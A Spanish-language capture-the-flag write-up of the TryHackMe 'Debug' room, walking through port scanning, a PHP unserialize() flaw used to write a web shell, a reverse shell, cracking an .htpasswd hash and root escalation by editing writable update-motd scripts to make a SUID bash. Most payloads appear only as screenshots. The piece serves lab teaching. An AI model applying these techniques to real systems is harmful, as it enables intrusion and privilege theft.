## TryHackMe  <> Debug

![image](https://github.com/Esevka/CTF/assets/139042999/0e76fc7e-29b5-4463-91c8-9e8f6285f71e)

Enlace Maquina: https://tryhackme.com/room/debug

Enunciado : 
  - The main idea of this room is to make you learn more about php deserialization!
  - Obtener flag

## Escaneo de puertos

- Lanzamos una traza ICMP(ping) para ver si la maquina esta activa, segun el ttl obtenido por proximidad al valor 64 podriamos decir que es una maquina Linux.

      ┌──(root㉿kali)-[/home/…/Desktop/ctf/debug/nmap]
      └─# ping -c1 10.10.5.207 
      PING 10.10.5.207 (10.10.5.207) 56(84) bytes of data.
      64 bytes from 10.10.5.207: icmp_seq=1 ttl=63 time=67.4 ms
      
      --- 10.10.5.207 ping statistics ---
      1 packets transmitted, 1 received, 0% packet loss, time 0ms
      rtt min/avg/max/mdev = 67.421/67.421/67.421/0.000 m

- Reporte Nmap (Obtenemos puertos abiertos servicios y versiones que estan corriendo).

      ┌──(root㉿kali)-[/home/…/Desktop/ctf/debug/nmap]
      └─# nmap -p- --open --min-rate 5000 -n -Pn -vvv 10.10.5.207 -oN open_ports 
      Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-24 15:43 CEST
      Initiating SYN Stealth Scan at 15:43
  
      PORT   STATE SERVICE REASON
      22/tcp open  ssh     syn-ack ttl 63
      80/tcp open  http    syn-ack ttl 63
      
      ┌──(root㉿kali)-[/home/…/Desktop/ctf/debug/nmap]
      └─# nmap -p 22,80 -sCV 10.10.5.207 -v -oN info_ports
      Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-24 15:45 CEST
      
      PORT   STATE SERVICE VERSION
      22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
      | ssh-hostkey: 
      |   2048 44ee1eba072a5469ff11e349d7dba901 (RSA)
      |   256 8b2a8fd8409533d5fa7a406a7f29e403 (ECDSA)
      |_  256 6559e4402ac2d70577b3af60dacdfc67 (ED25519)
  
      80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
      |_http-server-header: Apache/2.4.18 (Ubuntu)
      | http-methods: 
      |_  Supported Methods: GET HEAD POST OPTIONS
      |_http-title: Apache2 Ubuntu Default Page: It works
      Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

- Segun la version del servicio SSH que esta corriendo en el puerto 22, obtenemos su launchpad y podemos decir que estamos ante una maquina.

    ![image](https://github.com/Esevka/CTF/assets/139042999/a9663e95-1dde-4f20-9d53-54921d85b725)


## Analisis de vulnerabilidades en los servicios y explotacion de los mismos.

- Puerto 80,  nos carga lo siguiente y tras revisar el codigo no encontramos nada que nos pueda ayudar.

    ![image](https://github.com/Esevka/CTF/assets/139042999/19769df1-30d9-472b-8e34-470ea7a6db9c)

  - Utilizamos Gobuster para fuzzear la web por fuerza bruta en busca de directorios ocultos, como vemos hemos encontrado varios directorios interesantes.
 
        ┌──(root㉿kali)-[/home/…/Desktop/ctf/debug/nmap]
        └─# gobuster dir -u http://10.10.5.207 -w /usr/share/wordlists/dirb/common.txt -o fuzz
        ===============================================================
        Gobuster v3.5
        by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
        ===============================================================
        /.hta                 (Status: 403) [Size: 276]
        /.htaccess            (Status: 403) [Size: 276]
        /.htpasswd            (Status: 403) [Size: 276]
        /backup               (Status: 301) [Size: 311] [--> http://10.10.5.207/backup/]
        /grid                 (Status: 301) [Size: 309] [--> http://10.10.5.207/grid/]
        /index.php            (Status: 200) [Size: 5732]
        /index.html           (Status: 200) [Size: 11321]
        /javascripts          (Status: 301) [Size: 316] [--> http://10.10.5.207/javascripts/]
        /javascript           (Status: 301) [Size: 315] [--> http://10.10.5.207/javascript/]
        /server-status        (Status: 403) [Size: 276]
        Progress: 4607 / 4615 (99.83%)
        ===============================================================
        2023/08/24 15:55:34 Finished
        ===============================================================

    Interesante:
    
        --> index.php
    
        --> http://10.10.5.207/backup/index.php.bak

    Fichero index.php, contiene un formulario con un boton submit que es el encargado de ejecutar el codigo php
    
      ![image](https://github.com/Esevka/CTF/assets/139042999/160fec18-0919-48b4-b03a-74db2218c860)
      ![image](https://github.com/Esevka/CTF/assets/139042999/936e8029-4dee-4392-b4a0-38bfa9727e00)- 

    Nos descargamos el fichero index.php.bak

        ┌──(root㉿kali)-[/home/…/Desktop/ctf/debug/content]
        └─# curl http://10.10.5.207/backup/index.php.bak -o index.php 
          % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                         Dload  Upload   Total   Spent    Left  Speed
        100  6399  100  6399    0     0  36317      0 --:--:-- --:--:-- --:--:-- 36357


  - Analizamos el codigo php

     Codigo php que se ejecuta cada vez que pulsamos el boton submit del fomulario que mostramos anteriormente.

      ![image](https://github.com/Esevka/CTF/assets/139042999/fc1c4fbb-cb19-4191-a451-7ea0e2b48f70)

      ---Explicacion del codigo:

      1)Pulsamos el boton Submit

        $application = new FormSubmit;  ---> Se crea un objeto de la Class FormSubmit para ser
                                                instanciado en memoria y ejecutado.
    
        $application -> SaveMessage();  --> llamamos a la funcion SaveMessage().

      2)Ejecucion del proceso

        public $form_file = 'message.txt';
        public $message = '';             ---> Se establecen las variables que seran utilizadas
                                              en la funcion SaveMessage() y __destruct

        public function SaveMessage(){...} ---> Se encarga de recoger las variables del formulario mediante el metodo GET,
                                                para formar un string que sera almacenado en la variable $message.
    
        public function __destruct()  ---> Crea en el directorio raiz de la web un fichero con el nombre de la variable
                                      $form_file en el caso de que no exista con el contenido de la variable $message,
                                     en el caso de que el fichero exista le anade el contenido de la variable $message.  

      3)Sorpresa

        // Leaving this for now... only for debug purposes... do not touch!
        $debug = $_GET['debug'] ?? '';
        $messageDebug = unserialize($debug); ---> Vemos que comprueba si la variable debug existe en la url cuando hacemos
                                              el submit, en el caso de que exista utiliza la funcion unserialize(), sobre
                                             la data que le hemos pasado en dicha variable.
        
      ---Informacion necesaria para entender el proceso de explotacion.
    
      - Serialización de objetos            --> https://www.php.net/manual/es/language.oop5.serialization.php
        
      - Deserialización de objetos          --> https://www.php.net/manual/es/function.unserialize.php
        
      - Magic Method __destruct() en php       --> https://www.w3schools.com/php/php_oop_destructor.asp
  
          ![image](https://github.com/Esevka/CTF/assets/139042999/ff8dfb2d-e516-4eb9-8fcd-1899fbd6dfda)

      - Unserialize to RCE ---> https://notsosecure.com/remote-code-execution-php-unserialize

      - EXPLICACION,espero que se entienda

            Funcion unserialize(), le debemos pasar un string(serializado) que contenga una clase llamada 'FormSubmit'
            con las variables $form_file y $message con unos valores especificos.
    
            Lo que intentamos es crear mediante la funcion unserialize() otra instancia en memoria de la clase
            'FormSubmit', por lo que tendriamos la instancia creada con unserialize() y la creada de manera regular
            en el codigo.
        
            Php las tratara como dos instancias independiente de una misma clase con propiedades(valores de variables)
            diferentes, al ser la misma clase el metodo __destruct (es el mismo) por lo que se ejecutara dos veces uno
            con los valores de las variables del formulario y otra con los valores de las variables que pasamos mediante
            la funcion unserialize()
     
            De este modo podemos suplantar el valor de las variables en el metodo __destruct consiguiendo crear
            nuestro fichero.

      ---Explotacion del codigo

      1)Creamos nuestro objeto de la clase FormSubmit serializado donde le pasamos nombre del fichero '.php' para poder ejecutar codigo y como  message una ejecucion de codigo mediante la variable cmd.

      El resultado lo mostramos en formato serializado y formato urlencodeado que es el que necesitaremos.

      ![image](https://github.com/Esevka/CTF/assets/139042999/c4038187-4cd4-41d7-90b7-ccffbe9b4965)
 


      2)Ejecutamos nuestro payload, para ello utilizaremos burpsuite.

      Como vemos nos da un status 200 por lo que la solicitud ha sido exitosa.

      ![image](https://github.com/Esevka/CTF/assets/139042999/7ee2af68-9fe5-4741-972d-73b02024bea0)


      Si recordamos el script php en la raiz del sitio web debe  haber un fichero message.txt con mensajes, estos mensajes estan compuesto por los datos enviamos a traves del formulario.
    
      ![image](https://github.com/Esevka/CTF/assets/139042999/80eee2d8-e231-4964-bd06-5c1a5c670b65)

      Ahora vamos a ver si nos ha creado nuestro fichero esevka.php en la raiz del sitio web y podemos ejecutar comandos.

      ![image](https://github.com/Esevka/CTF/assets/139042999/b91c8b86-de59-4acf-be67-19bf5d9f2380)


## Explotacion, obtenemos reverse shell en la maquina victima.

  - Nos ponemos en escucha esperando nuestra conexion.
    
    ![image](https://github.com/Esevka/CTF/assets/139042999/0ba00db0-8d68-4efd-8ad7-80453cbf72f9)

  - Ejecutamos la reverse shell a traves de nuestro RCE.

    ![image](https://github.com/Esevka/CTF/assets/139042999/0a4277a6-2237-4489-9f35-ad553ce24bb1)

  - Upgrademos nuestra reverse shell para trabajar comodamente.

    ![image](https://github.com/Esevka/CTF/assets/139042999/4d4727c4-aa89-4ac0-bb3e-f29de5c06685)

## Postexplottacion y obtencion de flags

- Verificamos sistema 

      www-data@osboxes:/var/www/html$ lsb_release -a
      No LSB modules are available.
      Distributor ID: Ubuntu
      Description:    Ubuntu 16.04.6 LTS
      Release:        16.04
      Codename:       xenial

- En el directorio /html, que es el directorio en el que obtenemos la reverse shell vemos un fichero .htpasswd (fichero que almacena credenciales de usuarios para una autenticación de acceso básica en un servidor HTTP Apache.)

    El fichero contiene una credencial para el usuario james.
  
        www-data@osboxes:/var/www/html$ cat .htpasswd 
        james:$apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1

- Vamos a ver los posibles usuarios del sistema, como podemos ver james es un usuario del sistema.

      www-data@osboxes:/var/www/html$ cat /etc/passwd | grep /bin/bash
      root:x:0:0:root:/root:/bin/bash
      james:x:1001:1001::/home/james:/bin/bash

- Identificamos el tipo de hash que htpasswd utiliza para la clave.

  ![image](https://github.com/Esevka/CTF/assets/139042999/4cd2489c-1a4a-4d29-b9b9-65c0b4f442be)

    Intentamos crakear la clave.
  
    ![image](https://github.com/Esevka/CTF/assets/139042999/d61410a7-ea7f-43b4-9195-975cb4521c97)
    ![image](https://github.com/Esevka/CTF/assets/139042999/0e35d1d0-843c-4b5c-8796-e4d6b5fff286)
  
      Credenciales ---> james:jamaica

- Escalada horizontal, vemos si las credenciales son validas para loguearnos como el usuario james.
  
      www-data@osboxes:/var/www/html$ su james
      Password:                                                                                                            
      james@osboxes:/var/www/html$   -----------> BINGO <--------------
      
  Obtenemos la flag user.txt

      james@osboxes:~$ cat user.txt 
      7e37c84a66c$$$$$$$$$$$$700d08d28c20

- En el directorio del usuario james junto a la flag encontramos esta nota.

  Dice que tenemos permisos de edicion sobre los ficheros que configuran el mensaje de bienvenida del servicio ssh.
    
  ![image](https://github.com/Esevka/CTF/assets/139042999/ecc4ac8f-23d0-489f-babc-1c84764d848b)

  - Editamos el mensaje de bienvenida para realizar una escalada hacia root.
  
    INFO ---> Motd(Message Of The Day) servicio SSH: https://linuxconfig.org/how-to-change-welcome-message-motd-on-ubuntu-18-04-server

    Como vemos tenemos todos los permisos sobre los ficheros de configuracion.
    
        james@osboxes:/etc/update-motd.d$ ls -lat
        total 44
        drwxr-xr-x 134 root root  12288 Mar 10  2021 ..
        drwxr-xr-x   2 root root   4096 Mar 10  2021 .
        -rwxrwxr-x   1 root james     0 Mar 10  2021 00-header.save
        -rwxrwxr-x   1 root james  1220 Mar 10  2021 00-header
        -rwxrwxr-x   1 root james    97 Dec  7  2018 90-updates-available
        -rwxrwxr-x   1 root james   142 Dec  7  2018 98-fsck-at-reboot
        -rwxrwxr-x   1 root james   144 Dec  7  2018 98-reboot-required
        -rwxrwxr-x   1 root james   604 Nov  5  2017 99-esm
        -rwxrwxr-x   1 root james   299 Jul 22  2016 91-release-upgrade
        -rwxrwxr-x   1 root james  1157 Jun 14  2016 10-help-text

    Editamos el fichero 00-header.save

    ![image](https://github.com/Esevka/CTF/assets/139042999/583e318c-7463-4671-b067-5f9fd033021f)

    Nos conectamos por el servicio SSH para que muestre el mensaje de bienvenida y a su vez se ejecuten los comandos anteriores.
    Como podemos ver nos ha creado nuestra bash con el SUID activo y los permisos perfectamente.

    ![image](https://github.com/Esevka/CTF/assets/139042999/5166e170-325b-43ea-b1ae-1051728fed98)

    Para finalizar ejecutamos la bash realizando una escalada del usuario james to root, leemos la root flag

        james@osboxes:~$ /tmp/esevka -p
    
        esevka-4.3# whoami
        root
    
        esevka-4.3# cd /root
    
        esevka-4.3# ls
        root.txt
    
        esevka-4.3# cat root.txt 
        3c8c3d0fe$$$$$$$$$$$8e32f68fabf4b

    INFO: por que se utiliza la opcion -p al ejecutar la bash y nos convertimos en root.

        En sistemas Unix y Linux, cuando un archivo ejecutable tiene el bit SUID activo y es un script de shell
        (como un script de Bash), la opción -p a menudo se utiliza para indicar que el intérprete de comandos
        debe preservar los UID efectivos y reales al ejecutar el script, en lugar de ajustarlos al UID del usuario
        que lo está ejecutando. Esto es especialmente relevante en el contexto de scripts con bit SUID activo
        porque se desea mantener el nivel de acceso elevado.

        UID Real (Real UID): Es el UID del usuario que está ejecutando el proceso en ese momento. Representa la
        identidad real del usuario.

        UID Efectivo (Effective UID): Es el UID utilizado para determinar los permisos del usuario al acceder a
        recursos o realizar acciones. Puede ser diferente del UID real en ciertos casos, cuando se utilizan
        mecanismos de cambio de identidad, como el bit SUID (SetUID) en archivos ejecutables.


---> Maquina  Debug completa <---
---

        


    
    
